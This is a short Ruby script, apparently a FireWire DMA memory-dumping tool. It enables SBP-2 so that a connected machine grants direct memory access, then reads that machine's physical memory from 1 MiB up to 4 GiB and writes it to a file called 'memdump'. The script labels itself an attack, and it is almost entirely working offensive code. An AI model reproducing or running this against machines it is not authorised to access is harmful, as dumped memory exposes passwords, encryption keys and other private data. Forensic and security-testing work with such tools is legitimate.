#!/usr/bin/ruby
require './bus'
require 'pp'

def run(args)

    # Initialize
    @d = initialize_fw(@d)

    # Find memory size
    puts 'Detecting memory size...'
    memsize = 4 * 1024 * 1024 * 1024
    if not memsize
        fail('Could not determine memory size. Try increasing the delay after enabling SBP2 (-d switch)')
    else
        puts '%d MiB main memory detected' % (Integer(memsize)/(1024 * 1024)) 
    end

    # Attack
    puts 'Starting attack...'
    
    success = true
    
    begin
        loop_memory(@d, memsize)
    rescue IOError => e
        success = false
        puts '-', 'I/O Error, make sure FireWire interfaces are properly connected.'
        puts e.message
    end

    if !success
        fail('Failed to dump.')
    end 
end

def initialize_fw(d)
    @b = Bus.new
    # Enable SBP-2 support to ensure we get DMA
    @b.enable_sbp2()

    begin
        for i in 3.downto(1)
            puts "[+] Initializing bus and enabling SBP2, please wait %2d seconds or press Ctrl+C \r" % i; 
            STDOUT.flush
            sleep(1)
        end
    rescue 
        puts 'Interrupted'
    end 

    # Open the first device
    d = @b.devices
   
    if (d.length > 0)
        d = d[0]
        d.open()
        puts ''
    else
        raise 'nothing connected'
    end

    return d
end 

def loop_memory(d, memsize)
    f = File.open('memdump','w')
    # Skip the first 1 MiB of memory
    startmem = 1 * 1024 * 1024
    endmem = 4 * 1024 * 1024 * 1024

    chunk = 1024

    for addr in (startmem..endmem).step(chunk)
        cdata = d.read(addr, chunk)
        f.syswrite(cdata)
        # print "Data found %s at %d \r" % [cdata.unpack('C*').map{ |b| "%02X" % b }.join(), addr]
        STDOUT.flush
    end
end

def fail(msg)
    puts "\n [!] Attack unsuccessful."
    puts msg
    exit
end

if __FILE__ == $0
    run( ARGV )
end

